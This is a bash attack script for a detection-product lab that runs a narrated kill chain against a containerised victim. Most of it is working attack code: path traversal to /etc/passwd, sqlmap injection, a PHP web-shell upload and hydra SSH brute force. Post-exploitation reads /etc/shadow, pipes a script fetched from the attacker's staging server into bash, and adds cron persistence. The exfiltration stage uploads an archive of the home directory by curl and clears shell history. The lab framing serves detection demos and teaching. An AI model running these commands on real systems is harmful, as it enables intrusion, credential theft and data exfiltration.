#!/bin/bash
# ThreatLens attack lab — a narrated, real intrusion against the lab victim.
#   docker compose --profile lab run --rm attacker all          # full kill chain (~2 min)
#   docker compose --profile lab run --rm attacker recon|web|bruteforce|post|exfil
set -u
TARGET="${TARGET:-victim}"
PAUSE="${PAUSE:-4}"
ATTACKER_IP="$(hostname -i | awk '{print $1}')"
PASS=""

red()   { printf '\033[1;31m%s\033[0m\n' "$*"; }
dim()   { printf '\033[2m%s\033[0m\n' "$*"; }
green() { printf '\033[1;32m%s\033[0m\n' "$*"; }

stage() {
  echo
  red "▶ $1"
  dim "  $2"
  dim "  → watch ThreatLens: $3"
  sleep "$PAUSE"
}

remote() {
  echo "  \$ $1"
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
    -o ConnectTimeout=5 "admin@$TARGET" "$1" 2>&1 | head -4 | sed 's/^/    /'
  sleep 2
}

start_c2() {
  # The attacker's own staging server (inside the lab network) that the victim "calls back" to.
  (cd /opt/c2 && python3 -m http.server 8000 >/dev/null 2>&1 &)
}

recon() {
  stage "1/5  Reconnaissance" "nmap service scan and web content enumeration against $TARGET" \
        "Service Banner Probing + Reconnaissance Activity"
  nmap -Pn -sV -p 22,80 "$TARGET" | grep -E "^[0-9]+/tcp|Nmap done"
  nmap -Pn -p 80 --script http-enum "$TARGET" | grep -E "^\|" | head -8
}

web() {
  stage "2/5  Web application attack" "path traversal, SQL injection with sqlmap, web-shell upload" \
        "Web Path Traversal, SQL Injection Attempt, Web Shell Upload Attempt"
  curl -s -o /dev/null -w "  path traversal      -> HTTP %{http_code}\n" "http://$TARGET/download?file=../../../../etc/passwd"
  sqlmap -u "http://$TARGET/api/products?id=1" --batch --level=1 --risk=1 --technique=BU \
         --threads=2 --flush-session --disable-coloring 2>&1 \
    | grep -E "testing '|not injectable|all tested" | head -6 | sed 's/^/  /'
  curl -s -o /dev/null -w "  web shell upload    -> HTTP %{http_code}\n" \
       -X POST --data-binary '<?php system($_GET["c"]); ?>' "http://$TARGET/uploads/shell.php"
}

bruteforce() {
  stage "3/5  SSH brute force" "hydra against the 'admin' account with a common-password list" \
        "Brute Force Attack → Successful Login After Brute Force (CRITICAL) → SOAR auto-block"
  out="$(hydra -l admin -P /opt/wordlist.txt -t 4 -f -I "ssh://$TARGET" 2>&1)"
  echo "$out" | grep -E "attempt|host:|valid password" | tail -4 | sed 's/^/  /'
  PASS="$(echo "$out" | sed -n 's/.*password: \(.*\)$/\1/p' | head -1)"
  if [ -z "$PASS" ]; then red "  password not found — is the victim running?"; exit 1; fi
  green "  ✔ cracked: admin / $PASS"
}

ensure_pass() {
  if [ -z "$PASS" ]; then
    PASS="$(hydra -l admin -P /opt/wordlist.txt -t 4 -f -I "ssh://$TARGET" 2>&1 | sed -n 's/.*password: \(.*\)$/\1/p' | head -1)"
  fi
}

post() {
  ensure_pass
  stage "4/5  Post-exploitation" "commands executed on the compromised server over SSH" \
        "Credential Dumping, Remote Script Download and Execute, Persistence Mechanism"
  start_c2
  remote "id; uname -sr"
  remote "cat /etc/shadow"
  remote "curl -s -m 3 http://$ATTACKER_IP:8000/stage2.sh | bash"
  remote "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.cache/update') | crontab - 2>&1 || echo persistence attempted"
}

exfil() {
  ensure_pass
  stage "5/5  Exfiltration and covering tracks" "archive the home directory, upload it, clear shell history" \
        "Data Exfiltration Attempt, Event Log Cleared — campaign shows the full kill chain"
  start_c2
  remote "tar czf /tmp/loot.tgz /home/admin 2>/dev/null; curl -s -m 3 -T /tmp/loot.tgz http://$ATTACKER_IP:8000/upload; echo uploaded"
  remote "history -c && rm -rf ~/.bash_history; echo cleaned"
}

banner() {
  red "ThreatLens attack lab — attacker $ATTACKER_IP → target $TARGET"
  dim "Real tools, real logs. Only the isolated lab network is attacked."
}

case "${1:-all}" in
  all)        banner; recon; web; bruteforce; post; exfil; echo; green "Attack complete. Open Campaigns in ThreatLens to see the kill chain." ;;
  recon)      recon ;;
  web)        web ;;
  bruteforce) bruteforce ;;
  post)       post ;;
  exfil)      exfil ;;
  *) echo "usage: attack [all|recon|web|bruteforce|post|exfil]"; exit 2 ;;
esac
